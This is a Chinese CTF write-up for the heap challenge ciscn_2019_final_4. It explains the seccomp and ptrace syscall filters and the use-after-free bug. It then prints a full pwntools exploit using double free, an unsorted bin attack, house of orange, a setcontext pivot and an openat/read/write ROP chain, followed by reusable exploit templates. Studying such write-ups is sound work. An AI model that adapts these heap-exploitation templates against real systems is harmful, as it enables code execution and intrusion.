---
title: UAF With Out One_gadget
date: 2019-12-08 11:24:22
tags: IO_FILE 
---
what shall we do with UAF with out one_gadget.
<!--more-->
# prologue
最近在`buuoj`上做了比较有收获的一题把学到的东西总结一下,主要用两个方向一个`ptrace`另一个是`orange + setcontxt`
* `ptrace`主要是了解其主要的用法,并自己动手写一写.
* `orange + setcontxt`我感觉在很多情况下挺有用的，现在很多题都用到了`setcontext`,可以总结一下来搞一个模版之类的，可能另起一篇博客。

# Challenge

题目在[buuoj][1]上有复现
我在Github上的[备份][2](其中raw为原版binary,pwn是我为了方便调试patch后版本)

# Analysis
```s
exp.py  pwn  raw
➜  ciscn_2019_final_4 checksec ./raw
[*] '/home/n132/Desktop/ciscn_2019_final_4/raw'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
程序除了没开`PIE`其他都开了,有`add`,`show`,`free`三个功能,`add`中输入为`read`比较nice的..
主要的漏洞是`free`中没有清空指针,造成了`UAF`

以上是基本情况,接下来是本题特殊的地方,主要有两个部分:`seccmp`,`ptrace`

## seccmp
本题一开始就关掉了`execve`
```s
➜  ciscn_2019_final_4 seccomp-tools dump ./pwn
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x02 0x00 0x40000000  if (A >= 0x40000000) goto 0004
 0002: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
```

这个部分还是比较好搞的可以orw(open/read/wriet)来绕过。

## ptrace
其实也比较简单只是我不知道这个东西....通过本题学习和相关资料,有了一些了解.
本题和`ptrace`相关流程是
1. fork
2. 父进程进入`watch`函数监视子进程,子进程提供`note`主要服务.

其中`watch`函数
```amd
void __fastcall __noreturn watch(unsigned int a1)
{
  int stat_loc; // [rsp+34h] [rbp-ECh]
  __int64 v2; // [rsp+38h] [rbp-E8h]
  char v3; // [rsp+40h] [rbp-E0h]
  __int64 v4; // [rsp+B8h] [rbp-68h]
  unsigned __int64 v5; // [rsp+118h] [rbp-8h]
  v5 = __readfsqword(0x28u);
  wait(0LL);
  while ( 1 )
  {
    ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL);
    waitpid(a1, &stat_loc, 0);
    if ( !(stat_loc & 0x7F) || (char)((char)((stat_loc & 0x7F) + 1) >> 1) > 0 || (stat_loc & 0xFF00) >> 8 != 5 )
      break;
    ptrace(PTRACE_GETREGS, a1, 0LL, &v3);
    v2 = v4;
    if ( (_BYTE)v4 == 59 || (_BYTE)v2 == 59 || v2 == 57 || v2 == 58 || v2 == 101 )
    {
      puts("hey! what are you doing?");
      exit(-1);
    }
  }
  exit(-1);
```

接下来是ptrace的一些基本用法,通过`man ptrace`可以得知其用法还是灰常丰富的...反正我是没耐心读完的...这里主要了解两种主要的用法和一些基本的东西.
首先是ptrace的函数原型`long ptrace(enum __ptrace_request request, pid_t pid,void *addr, void *data);`
其中的`request`参数全部内容可以参照[此处源码][3]
在[axiong#博客]上听说比较常用的有以下两种追踪模式
1.  PTRACE_TRACEME = 0
2.  PTRACE_ATTACH = 16

本题使用的0号request所以是主要看看`PTRACE_TRACEME`的介绍（来自man）:
>PTRACE_TRACEME
>Indicate that this process is to be traced by its parent.  A process probably shouldn't make this request if its parent isn't expecting to trace it.  (pid, addr, and data are ignored.) The PTRACE_TRACEME request is used only by the tracee; the remaining requests are used only by the tracer.  In the following requests, pid specifies the thread ID of the tracee to be acted on.  For requests other than PTRACE_ATTACH, PTRACE_SEIZE, PTRACE_INTERRUPT, and PTRACE_KILL, the tracee must be stopped.


大概意思是说这个函数表面调用这个函数的进程将要被他父进程追踪了,然后如果这个进程发送其他的请求例如上面那几个就会被stop.

题目中还用到的两个`request`是
1. PTRACE_SYSCALL 
2. PTRACE_GETREGS

这两个`request`比较好理解详细的话man里面也有.
`PTRACE_SYSCALL` ：`tracee`继续运行但是下一次`syscall`时会被`tracer`捕获.
`PTRACE_GETREGS` ：`tracer`获得`tracee`的寄存器状.

所以本题程序还是比较好了解的,流程大致为子进程请求父进程`trace`自己接下来干正事;父进程进行如下大致流程
```s
1. 等待子进程的`PTRACE_TRACEME`请求
2. 发送信号让子进程继续运行,但是循环监视子进程的每一次系统调用并获得其调用号
3. 确认调用号是否处于黑名单如果处于黑名单那么嘲讽一波后推出.
```

子进程中有个kill之前没有看到过,查了一下发现是用来发送信号的.19号信号是`SIGCONT`.
也就是继续运行啥的..

至此本题分析也告一段落,我们得到以下信息.
1. seccmp 禁用了`sys_execve`
2. 父进程监视系统调用其中禁止了`sys_mmap`,`sys_open`,`sys_fork`,`sys_vfork`,`sys_ptrace`
3. 存在UAF,存在易用泄漏点.

(虽然我不知道出题人为啥不把`sys_execve`直接也放进监视黑名单...)

# solution
在做题过程中首先遇到的问题将会是,难调试..
于是我通过各种`nop`把`watch`,`fork`,`ptrace`对于此题控制执行流之前部分没用的都给`patch`掉了.就可以像是一般做题一样了..
于是我高高兴兴地开始做题了...因为太高兴了以至于我忘记了本题的限制`double free`一条龙地泄漏`libc/heap`控制了`__malloc_hook`然后发觉并没什么用.

依照以前的经验于是我就想到了`setcontext+0x35`来扩大控制执行流.
但是`malloc`的参数比较难受...而`rdi`对于`setcontxt+0x35`是关键的...因为本题环境是`ubuntu16.04+2.23`于是我就走`house of orange`控制执行流了..

幸运地,我在凌乱的反复`overlap`的堆区域布置好了`Fake IO_FILE`,然后多次调试终于完成了`open read write`...但是将`binary`换回成未`patch`版本时一直跳出出题人的嘲讽`hey! what are you doing?`然后我就黑人问号了...我`orw`都不是黑名单里的..忽然想起以前在`winesap`的视频中有看到可以用`strace`来查看程序系统调用于是我使用如下命令找到了问题所在.

`strace -o output.txt -T -tt -e trace=all -p {pid}`
在结果中发现程序居然调用了..`open`,`mmap`之类仔细看了看发现打开的是`/proc/self/maps`....就想起了...`mprinterr`会输出内存`map`...
于是只能手把手搞了
1. 设置一个大小为0x60的`small_bin`然`overlap`其中的内容成为一个`FAKE_IO_FILE`
2. `unsorted bin atk`控制`_IO_list_all`
3. 通过`exit` trigger 

同时发现一个比较严重的问题...open不给我用...谷歌了一下就搜到原题了（我真不是故意的...）...发现有[@xp0int师傅][5]用`openat`来打开..
学到了学到了.这里摘录一下`openat`相当于`open`的用法
`openat(0,"绝对路径",0)`当第二个参数为绝对路径时相当于`open`其他用法用到了再说.

```python
Summary:
1. leak libc&heap
2. set a small_bin_chunk which size == 0x60
3. set _IO_list_all (unsorted bin atk)
4. exit to trigger off setcontext+0x35
```

# exp
可能有些凌乱因为边做边改....发现有问题了就在有问题的基础上改回来...没有倒回去...所以有可能很多很奇怪的操作...

```python
from pwn import *
def cmd(c):
	p.sendlineafter(">> ",str(c))
def add(size,c="Y"):
	cmd(1)
	p.sendlineafter("?\n",str(size))
	p.sendafter("?\n",c)
def free(idx):
	cmd(2)
	p.sendlineafter("?\n",str(idx))
def show(idx):
	cmd(3)
	p.sendlineafter("?\n",str(idx))
context.log_level='debug'
context.arch='amd64'
one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one = one_gadget[2]
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=remote("buuoj.cn",25942)
#p=process('./pwn')
#raw_input()
name="A"*0x1
p.sendlineafter("? \n",name)
add(0x88,p64(0x71)*17)#0
add(0x68,p64(0x21)*5+p64(0x71))#1
add(0x68,p64(0x21)*13)#2
add(1)#
free(0)
show(0)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)

libc.address=base
add(0x68,p64(0x71)*13)#4
free(1)
free(2)
show(2)
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x90
free(1)
syscall=0x00000000000bc375+base
fio=heap+0x70
fake =p64(fio+0x8)+p64(syscall)
fake =fake.ljust(0x20,'\x00')+p64(1)
fake =fake.ljust(0x38,'\x00')+p64(fio+0xd8-0x10)+p64(0x47b75+base)
add(0x68,p64(heap+0x60))#5
add(0x68,fake)#6 0x100
add(0x68)#7 0x90
add(0x68,flat(0,0x61))#8 0x60 overlap
add(0x78,p64(0x71)*15)#9 FAKE IO




free(5)
free(4)
free(5)
add(0x68,p64(fio-0x10))#10
add(0x68)#11
add(0x68)#12


fake = p64(heap+0x220-0x60)+p64(0x61)+p64(0x47b75+base)+p64(0)+p64(0)+p64(1)
add(0x68,fake)#13




regs=flat(heap+0x220-0x60,0,heap+0x400,0,0,0x100)
regs=regs.ljust(0xa8-0x60,'\x00')+p64(syscall)
add(0x100,regs)#14
add(0x68)#15
free(14)
free(15)
free(0)
free(15)

add(0x68,p64(heap+0x200))
add(0x68)
add(0x68)
add(0x68,p64(0)+p64(0x21)+p64(0)+p64(libc.sym['_IO_list_all']-0x10))
add(0x18)

free(15)
free(0)
free(15)
add(0x68,p64(heap+0xc0))
add(0x68)
add(0x68)
add(0x68,p64(syscall)+p64(0)+p64(heap+0x78)+p64(0)*2+p64(0x100))

#gdb.attach(p,'b *0x7ffff7a89193')

cmd(4)
#1. set small bin
#2. unsorted bin attack

rax=0x0000000000033544+base
rdi=0x0000000000021102+base
rsi=0x00000000000202e8+base
rdx=0x0000000000001b92+base


rop=flat(rsi,heap+0x150,rdi,0,rdx,0,rax,257,syscall,rdi,3,rsi,heap+0x300,rdx,0x30,rax,0,syscall,rdi,1,rsi,heap+0x300,rdx,0x30,rax,1,syscall)
p.send(rop+"/flag\x00")
log.warning(hex(base))
log.warning(hex(heap))
p.interactive('n132>')
```

相比做天做的9题...这题确实学到了很多东西...
至此本题结束,我会在日后的一些博客中中总结一些模版类的东西方便自己日后使用.

# Summary
相比出题人预期思路(`malloc_hook`写`add rsp,0x38`来`pivot`)来说我感觉我的方法普适性还是更好的而且不需要开始时候输入`name`即使在开启`pie`情况下也可以完成攻击.
于是我试着总结一下(可能目前遇到的类似题目还不是特别多而堆区域连续的0xe0大小空间也不常见目前用着orange的模板还不错).
主要思路是如果无法控制`__free_hook`且在`libc-2.23`情况下可以利用`house_of_orange`+`setcontext+0x35`调用`read`传入`ropchain`来完成攻击，简易模版如下.

# Modules

## house_of_orange & setcontext+0x35
```python
fake = p64(fio)+p64(0x61)+p64(libc.sym['setcontext']+0x35)+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake = fake.ljust(0x68,'\x00')+p64(rdi)+p64(rsi)+p64(0)+p64(rdx)
fake = fake.ljust(0xa0,'\x00')+p64(fio+0x8)+p64(syscall)
fake = fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.sym['setcontext']+0x35)
```
## ROP
`bases libc-2.23`
```python
rax=0x0000000000033544+base
rdi=0x0000000000021102+base
rsi=0x00000000000202e8+base
rdx=0x0000000000001b92+base
syscall=0x00000000000bc375+base
def do_sys_call(num,a1,a2,a3):
    return flat(rax,num,rdi,a1,rsi,a2,rdx,a3)
rop=do_sys_call(2,filename,0,0)+do_sys_call(0,3,tmp_buffer,0x30)+do_sys_call(1,1,tmp_buffer,0x30);
```


[1]: https://buuoj.cn/challenges#ciscn_2019_final_4
[2]: https://github.com/n132/Watermalon/tree/master/CISCN-2019/finnal/ciscn_2019_final_4
[3]: https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86/sys/ptrace.h.html
[4]: https://www.cnblogs.com/axiong/p/6184638.html
[5]: http://blog.leanote.com/post/xp0int/%5BPwn%5D-Pwn7-cpt.shao